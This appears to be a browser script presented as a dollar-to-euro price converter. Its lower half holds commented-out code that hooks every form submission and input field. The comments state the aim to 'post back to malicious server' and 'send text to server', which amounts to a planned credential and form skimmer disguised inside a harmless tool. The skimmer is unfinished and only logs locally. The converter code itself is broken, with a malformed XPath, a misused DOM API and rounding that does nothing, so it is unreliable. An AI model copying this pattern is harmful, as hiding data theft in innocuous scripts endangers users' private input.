/* Converts dollars to euros and displays tooltip with converted value. */
function getEuroEquivalent(dolAmt) {
    var euroAmt = dolAmt * 0.91;
    return '€' + euroAmt * 100 / 100;
}

// Get all price fields and elements with $ in them
var dollarNodes = document.evaluate('//*[text()=\'$\'', 'document');
dollarNodes.forEach(function (currNode) {
    currNode.setAttribute('color', 'green');

    // Convert dollars to euros (retain rest of string if exists)
    var text = currNode.textContent;
    var valStart = text.indexOf('$');
    if (valStart > 0) {
        var dolAmt = parseFloat(text.substring(valStart + 1));
        var restOfText = text.substring((valStart + 1 + (dolAmt + '').length));
        var convertedVal = getEuroEquivalent(dolAmt);
        var combinedText = text.substring(0, valStart) + convertedVal + restOfText;
        currNode.innerHTML = combinedText;
    }
});


// Also search document for form inputs
// If form exists add eventListener for on submit to post back to malicious server
// var forms = document.querySelectorAll("form");
// for (var f in forms) {
//     forms[f].addEventListener("submit", function(e) {
//         // TODO: can I snoop on event parameters to jack here?
//         console.log(e);
//     })
// }
//
// // Also search document for input elements or text-area elements
// var inputs = document.querySelectorAll("input");
// for (var i in inputs) {
//     inputs[i].addEventListener("change", function(e) {
//         if (e && e.children && e.children.length > 0) {
//             let text = e.children[0].text;
//             if (text) {
//                 console.log(text);
//             // TODO: send text to server
//             }
//         }
//     })
// }